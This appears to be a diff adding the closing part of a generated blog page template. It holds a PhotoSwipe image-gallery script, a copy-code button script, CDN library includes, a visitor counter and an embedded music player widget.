+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div>
+
+<link rel="stylesheet" href="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe.min.css">
+<link rel="stylesheet" href="https://cdn.staticfile.org/photoswipe/4.1.3/default-skin/default-skin.min.css">
+<script src="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe.min.js"></script>
+<script src="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe-ui-default.min.js"></script>
+
+<script>
+    function viewer_init() {
+        let pswpElement = document.querySelectorAll('.pswp')[0];
+        let $imgArr = document.querySelectorAll(('.article-entry img:not(.reward-img)'))
+
+        $imgArr.forEach(($em, i) => {
+            $em.onclick = () => {
+                // slider展开状态
+                // todo: 这样不好，后面改成状态
+                if (document.querySelector('.left-col.show')) return
+                let items = []
+                $imgArr.forEach(($em2, i2) => {
+                    let img = $em2.getAttribute('data-idx', i2)
+                    let src = $em2.getAttribute('data-target') || $em2.getAttribute('src')
+                    let title = $em2.getAttribute('alt')
+                    // 获得原图尺寸
+                    const image = new Image()
+                    image.src = src
+                    items.push({
+                        src: src,
+                        w: image.width || $em2.width,
+                        h: image.height || $em2.height,
+                        title: title
+                    })
+                })
+                var gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, items, {
+                    index: parseInt(i)
+                });
+                gallery.init()
+            }
+        })
+    }
+    viewer_init()
+</script> 
+<!-- MathJax -->
+
+<!-- Katex -->
+
+<!-- busuanzi  -->
+ 
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+ 
+<!-- ClickLove -->
+
+<!-- ClickBoom1 -->
+
+<!-- ClickBoom2 -->
+
+<!-- CodeCopy -->
+ 
+<link rel="stylesheet" href="/css/clipboard.css">
+ <script src="https://cdn.staticfile.org/clipboard.js/2.0.10/clipboard.min.js"></script>
+<script>
+  function wait(callback, seconds) {
+    var timelag = null;
+    timelag = window.setTimeout(callback, seconds);
+  }
+  !function (e, t, a) {
+    var initCopyCode = function(){
+      var copyHtml = '';
+      copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
+      copyHtml += '<i class="ri-file-copy-2-line"></i><span>COPY</span>';
+      copyHtml += '</button>';
+      $(".highlight .code pre").before(copyHtml);
+      $(".article pre code").before(copyHtml);
+      var clipboard = new ClipboardJS('.btn-copy', {
+        target: function(trigger) {
+          return trigger.nextElementSibling;
+        }
+      });
+      clipboard.on('success', function(e) {
+        let $btn = $(e.trigger);
+        $btn.addClass('copied');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-checkbox-circle-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPIED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-checkbox-circle-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+      clipboard.on('error', function(e) {
+        e.clearSelection();
+        let $btn = $(e.trigger);
+        $btn.addClass('copy-failed');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-time-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPY FAILED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-time-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+    }
+    initCopyCode();
+  }(window, document);
+</script>
+ 
+<!-- CanvasBackground -->
+ 
+<script src="/js/dz.js"></script>
+ 
+<script>
+  if (window.mermaid) {
+    mermaid.initialize({ theme: "forest" });
+  }
+</script>
+
+
+    
+    <div id="music">
+    
+    
+    
+    <iframe frameborder="no" border="1" marginwidth="0" marginheight="0" width="200" height="52"
+        src="//music.163.com/outchain/player?type=2&id=22707008&auto=0&height=32"></iframe>
+</div>
+
+<style>
+    #music {
+        position: fixed;
+        right: 15px;
+        bottom: 0;
+        z-index: 998;
+    }
+</style>
+    
+    
+
+  </div>
+</body>
+
+</html>
